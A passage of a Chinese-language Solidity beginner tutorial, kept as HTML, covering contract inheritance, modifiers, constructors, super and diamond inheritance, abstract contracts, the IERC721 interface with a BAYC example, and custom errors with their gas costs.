class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Yeye&#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line">    // 定义3个function: hip(), pop(), yeye()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出改为Baba。</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Erzi is Yeye, Baba&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出值为Erzi。</span><br><span class="line">    function hip() public virtual override(Yeye, Baba)&#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override(Yeye, Baba) &#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126213416543.png" alt="image-20250126213416543"></p><h3 id="修饰器的继承">修饰器的继承</h3><p><code>Solidity</code>中的修饰器（<code>Modifier</code>）同样可以继承，用法与函数继承类似，在相应的地方加<code>virtual</code>和<code>override</code>关键字即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Base1 &#123;</span><br><span class="line">    modifier exactDividedBy2And3(uint _a) virtual &#123;</span><br><span class="line">        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Identifier is Base1 &#123;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数</span><br><span class="line">    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123;</span><br><span class="line">        return getExactDividedBy2And3WithoutModifier(_dividend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值</span><br><span class="line">    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123;</span><br><span class="line">        uint div2 = _dividend / 2;</span><br><span class="line">        uint div3 = _dividend / 3;</span><br><span class="line">        return (div2, div3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Identifier</code>合约可以直接在代码中使用父合约中的<code>exactDividedBy2And3</code>修饰器，也可以利用<code>override</code>关键字重写修饰器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier exactDividedBy2And3(uint _a) override &#123;</span><br><span class="line">    _;</span><br><span class="line">    require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126214328979.png" alt="image-20250126214328979"></p><p>完整的测试代码<code>Base1.sol</code>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract Base1 &#123;</span><br><span class="line">    modifier exactDividedBy2And3(uint _a) virtual &#123;</span><br><span class="line">        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Identifier is Base1 &#123;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数</span><br><span class="line">    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123;</span><br><span class="line">        return getExactDividedBy2And3WithoutModifier(_dividend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值</span><br><span class="line">    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123;</span><br><span class="line">        uint div2 = _dividend / 2;</span><br><span class="line">        uint div3 = _dividend / 3;</span><br><span class="line">        return (div2, div3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数的继承">构造函数的继承</h3><p>子合约有两种方法继承父合约的构造函数。举个简单的例子，父合约<code>A</code>里面有一个状态变量<code>a</code>，并由构造函数的参数来确定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 构造函数的继承</span><br><span class="line">abstract contract A &#123;</span><br><span class="line">    uint public a;</span><br><span class="line"></span><br><span class="line">    constructor(uint _a) &#123;</span><br><span class="line">        a = _a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>在继承时声明父构造函数的参数，例如：<code>contract B is A(6)</code></li><li>在子合约的构造函数中声明构造函数的参数，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的测试代码<code>A.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract A&#123;</span><br><span class="line">    uint public a;</span><br><span class="line">    constructor(uint _a) &#123;</span><br><span class="line">        a = _a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126214956006.png" alt="image-20250126214956006"></p><h3 id="调用父合约的函数">调用父合约的函数</h3><p>子合约有两种方式调用父合约的函数，直接调用和利用<code>super</code>关键字。</p><ol><li>直接调用：子合约可以直接用<code>父合约名.函数名()</code>的方式来调用父合约函数，例如<code>Yeye.pop()</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callParent() public&#123;</span><br><span class="line">    Yeye.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>super</code>关键字：子合约可以利用<code>super.函数名()</code>来调用最近的父合约函数。<code>Solidity</code>继承关系按声明时从右到左的顺序是：<code>contract Erzi is Yeye, Baba</code>，那么<code>Baba</code>是最近的父合约，<code>super.pop()</code>将调用<code>Baba.pop()</code>而不是<code>Yeye.pop()</code>：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function callParentSuper() public&#123;</span><br><span class="line">    // 将调用最近的父合约函数，Baba.pop()</span><br><span class="line">    super.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="钻石继承">钻石继承</h3><p>在面向对象编程中，钻石继承（菱形继承）指一个派生类同时有两个或两个以上的基类。</p><p>在多重+菱形继承链条上使用<code>super</code>关键字时，需要注意的是使用<code>super</code>会调用继承链条上的每一个合约的相关函数，而不是只调用最近的父合约。</p><p>我们先写一个合约<code>God</code>，再写<code>Adam</code>和<code>Eve</code>两个合约继承<code>God</code>合约，最后让创建合约<code>people</code>继承自<code>Adam</code>和<code>Eve</code>，每个合约都有<code>foo</code>和<code>bar</code>两个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">/* 继承树：</span><br><span class="line">  God</span><br><span class="line"> /  \</span><br><span class="line">Adam Eve</span><br><span class="line"> \  /</span><br><span class="line">people</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">contract God &#123;</span><br><span class="line">    event Log(string message);</span><br><span class="line"></span><br><span class="line">    function foo() public virtual &#123;</span><br><span class="line">        emit Log(&quot;God.foo called&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public virtual &#123;</span><br><span class="line">        emit Log(&quot;God.bar called&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Adam is God &#123;</span><br><span class="line">    function foo() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Adam.foo called&quot;);</span><br><span class="line">        super.foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Adam.bar called&quot;);</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Eve is God &#123;</span><br><span class="line">    function foo() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Eve.foo called&quot;);</span><br><span class="line">        super.foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Eve.bar called&quot;);</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract people is Adam, Eve &#123;</span><br><span class="line">    function foo() public override(Adam, Eve) &#123;</span><br><span class="line">        super.foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public override(Adam, Eve) &#123;</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，调用合约<code>people</code>中的<code>super.bar()</code>会依次调用<code>Eve</code>、<code>Adam</code>，最后是<code>God</code>合约。</p><p>虽然<code>Eve</code>、<code>Adam</code>都是<code>God</code>的子合约，但整个过程中<code>God</code>合约只会被调用一次。原因是<code>Solidity</code>借鉴了Python的方式，强制一个由基类构成的DAG（有向无环图）使其保证一个特定的顺序。更多细节你可以查阅<a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html?highlight=%E7%BB%A7%E6%89%BF#index-16">Solidity的官方文档</a>。</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126223941045.png" alt="image-20250126223941045"></p><h2 id="抽象合约和接口">抽象合约和接口</h2><p>这一讲，我们用<code>ERC721</code>的接口合约为例介绍<code>Solidity</code>中的抽象合约（<code>abstract</code>）和接口（<code>interface</code>），帮助大家更好的理解<code>ERC721</code>标准。</p><p><code>ERC-721</code>是以太坊网络上用于<strong>实现非同质化代币（NFT）的标准。它定义了一组规则，允许创建具有唯一性的数字资产或代币。与ERC-20标准的同质化代币不同</strong>，<code>ERC-721</code>代币每一个都是独一无二的，可以用来表示艺术作品、收藏品、游戏道具、房地产等独特的资产。</p><h3 id="抽象合约">抽象合约</h3><p>如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体<code>&#123;&#125;</code>中的内容，则必须将该合约标为<code>abstract</code>，不然编译会报错；另外，未实现的函数需要加<code>virtual</code>，以便子合约重写。如果我们还没想好具体怎么实现某个函数，那么可以把合约标为<code>abstract</code>，之后让别人补写上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abstract contract InsertionSort&#123;</span><br><span class="line">    function insertionSort(uint[] memory a) public pure virtual returns(uint[] memory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试抽象合约的代码<code>Abstract.sol</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">abstract contract Base&#123;</span><br><span class="line">    string public name = &quot;Base&quot;;</span><br><span class="line">    function getAlias() public pure virtual returns(string memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BaseImpl is Base&#123;</span><br><span class="line">    function getAlias() public pure override returns(string memory)&#123;</span><br><span class="line">        return &quot;BaseImpl&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果如下：</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127032832688.png" alt="image-20250127032832688"></p><h3 id="接口">接口</h3><p>接口类似于抽象合约，但它不实现任何功能。接口的规则：</p><ol><li><strong>不能包含状态变量</strong></li><li><strong>不能包含构造函数</strong></li><li><strong>不能继承除接口外的其他合约</strong></li><li><strong>所有函数都必须是external且不能有函数体</strong></li><li><strong>继承接口的非抽象合约必须实现接口定义的所有功能</strong></li></ol><p>虽然接口不实现任何功能，但它非常重要。接口是智能合约的骨架，定义了合约的功能以及如何触发它们。</p><p>如果智能合约实现了某种接口（比如<code>ERC20</code>或<code>ERC721</code>），其他Dapps和智能合约就知道如何与它交互。</p><p>因为接口提供了两个重要的信息：</p><ol><li>合约里每个函数的<code>bytes4</code>选择器，以及函数签名<code>函数名(每个参数类型）</code>。</li><li>接口id（更多信息见<a href="https://eips.ethereum.org/EIPS/eip-165">EIP165</a>）</li></ol><p>另外，接口与合约<code>ABI</code>（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的<code>ABI</code>，利用<a href="https://gnidan.github.io/abi-to-sol/">abi-to-sol工具</a>，也可以将<code>ABI json</code>文件转换为<code>接口sol</code>文件。</p><p>我们以<code>ERC721</code>接口合约<code>IERC721</code>为例，它定义了3个<code>event</code>和9个<code>function</code>，所有<code>ERC721</code>标准的NFT都实现了这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以<code>;</code>代替函数体<code>&#123; &#125;</code>结尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721 is IERC165 &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);</span><br><span class="line">    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);</span><br><span class="line">    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);</span><br><span class="line">    </span><br><span class="line">    function balanceOf(address owner) external view returns (uint256 balance);</span><br><span class="line"></span><br><span class="line">    function ownerOf(uint256 tokenId) external view returns (address owner);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function approve(address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function getApproved(uint256 tokenId) external view returns (address operator);</span><br><span class="line"></span><br><span class="line">    function setApprovalForAll(address operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">    function isApprovedForAll(address owner, address operator) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试接口的代码<code>Interface.sol</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">interface Base&#123;</span><br><span class="line">    function getFirstName() external pure returns (string memory);</span><br><span class="line">    function getLastName() external pure returns (string memory);</span><br><span class="line">&#125;</span><br><span class="line">contract BaseImpl is Base&#123;</span><br><span class="line">    function getFirstName() external pure override returns(string memory)&#123;</span><br><span class="line">        return &quot;Amazing&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function getLastName() external pure override returns(string memory)&#123;</span><br><span class="line">        return &quot;Ang&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127121544577.png" alt="image-20250127121544577"></p><h3 id="IERC721事件">IERC721事件</h3><p><code>IERC721</code>包含3个事件，其中<code>Transfer</code>和<code>Approval</code>事件在<code>ERC20</code>中也有。</p><ul><li><code>Transfer</code>事件：在转账时被释放，记录代币的发出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>Approval</code>事件：在授权时被释放，记录授权地址<code>owner</code>，被授权地址<code>approved</code>和<code>tokenId</code>。</li><li><code>ApprovalForAll</code>事件：在批量授权时被释放，记录批量授权的发出地址<code>owner</code>，被授权地址<code>operator</code>和授权与否的<code>approved</code>。</li></ul><h3 id="IERC721函数">IERC721函数</h3><ul><li><code>balanceOf</code>：返回某地址的NFT持有量<code>balance</code>。</li><li><code>ownerOf</code>：返回某<code>tokenId</code>的主人<code>owner</code>。</li><li><code>transferFrom</code>：普通转账，参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>safeTransferFrom</code>：安全转账（如果接收方是合约地址，会要求实现<code>ERC721Receiver</code>接口）。参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>approve</code>：授权另一个地址使用你的NFT。参数为被授权地址<code>approve</code>和<code>tokenId</code>。</li><li><code>getApproved</code>：查询<code>tokenId</code>被批准给了哪个地址。</li><li><code>setApprovalForAll</code>：将自己持有的该系列NFT批量授权给某个地址<code>operator</code>。</li><li><code>isApprovedForAll</code>：查询某地址的NFT是否批量授权给了另一个<code>operator</code>地址。</li><li><code>safeTransferFrom</code>：安全转账的重载函数，参数里面包含了<code>data</code>。</li></ul><h3 id="什么时候使用接口？">什么时候使用接口？</h3><p>如果我们知道一个合约实现了<code>IERC721</code>接口，我们不需要知道它具体代码实现，就可以与它交互。</p><p>无聊猿<code>BAYC</code>属于<code>ERC721</code>代币，实现了<code>IERC721</code>接口的功能。我们不需要知道它的源代码，只需知道它的合约地址，用<code>IERC721</code>接口就可以与它交互，比如用<code>balanceOf()</code>来查询某个地址的<code>BAYC</code>余额，用<code>safeTransferFrom()</code>来转账<code>BAYC</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract interactBAYC &#123;</span><br><span class="line">    // 利用BAYC地址创建接口合约变量（ETH主网）</span><br><span class="line">    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);</span><br><span class="line"></span><br><span class="line">    // 通过接口调用BAYC的balanceOf()查询持仓量</span><br><span class="line">    function balanceOfBAYC(address owner) external view returns (uint256 balance)&#123;</span><br><span class="line">        return BAYC.balanceOf(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 通过接口调用BAYC的safeTransferFrom()安全转账</span><br><span class="line">    function safeTransferFromBAYC(address from, address to, uint256 tokenId) external&#123;</span><br><span class="line">        BAYC.safeTransferFrom(from, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异常">异常</h2><p>这一讲，我们介绍<code>Solidity</code>三种抛出异常的方法：<code>error</code>，<code>require</code>和<code>assert</code>，并比较三种方法的<code>gas</code>消耗。</p><h3 id="异常-2">异常</h3><p>写智能合约经常会出<code>bug</code>，<code>Solidity</code>中的异常命令帮助我们<code>debug</code>。</p><p>测试代码<code>Error.sol</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// Gas cost在Remix中测试得到 使用0.8.26版本编译</span><br><span class="line">// 参数使用 tokenId = 123, address = &#123;any address&#125;</span><br><span class="line"></span><br><span class="line">// 自定义error</span><br><span class="line">//error TransferNotOwner();</span><br><span class="line"></span><br><span class="line">error TransferNotOwner(address sender);</span><br><span class="line"></span><br><span class="line">contract Errors &#123;</span><br><span class="line">    // 一组映射，记录每个TokenId的Owner</span><br><span class="line">    mapping(uint256 =&gt; address) private _owners;</span><br><span class="line"></span><br><span class="line">    // Error方法: gas cost 24095</span><br><span class="line">    // Error方法: gas cost 24113</span><br><span class="line">    function transferOwner1(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">        if (_owners[tokenId] != msg.sender) &#123;</span><br><span class="line">            //revert TransferNotOwner();</span><br><span class="line">            revert TransferNotOwner(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // require方法: gas cost 24211</span><br><span class="line">    function transferOwner2(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">        require(_owners[tokenId] == msg.sender, &quot;Transfer Not Owner&quot;);</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // assert方法: gas cost 24109</span><br><span class="line">    function transferOwner3(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">        assert(_owners[tokenId] == msg.sender);</span><br><span class="line">        _owners[tokenId] = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Error">Error</h3><p><code>error</code>是<code>solidity 0.8.4版本</code>新加的内容，方便且高效（省<code>gas</code>）地向用户解释操作失败的原因，同时还可以在抛出异常的同时携带参数，帮助开发者更好地调试。人们可以在<code>contract</code>之外定义异常。下面，我们定义一个<code>TransferNotOwner</code>异常，当用户不是代币<code>owner</code>的时候尝试转账，会抛出错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(); // 自定义error</span><br></pre></td></tr></table></figure><p>我们也可以定义一个携带参数的异常，来提示尝试转账的账户地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(address sender); // 自定义的带参数的error</span><br></pre></td></tr></table></figure><p>在执行当中，<code>error</code>必须搭配<code>revert</code>（回退）命令使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner1(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    if(_owners[tokenId] != msg.sender)&#123;</span><br><span class="line">        revert TransferNotOwner();</span><br><span class="line">        // revert TransferNotOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们定义了一个<code>transferOwner1()</code>函数，它会检查代币的<code>owner</code>是不是发起人，如果不是，就会抛出<code>TransferNotOwner</code>异常；如果是的话，就会转账。</p><p>不带参数的<code>error</code>，消耗<code>gas</code>量为<code>24095</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127123837474.png" alt="image-20250127123837474"></p><p>带参数的<code>error</code>，消耗<code>gas</code>量为<code>24113</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127124300009.png" 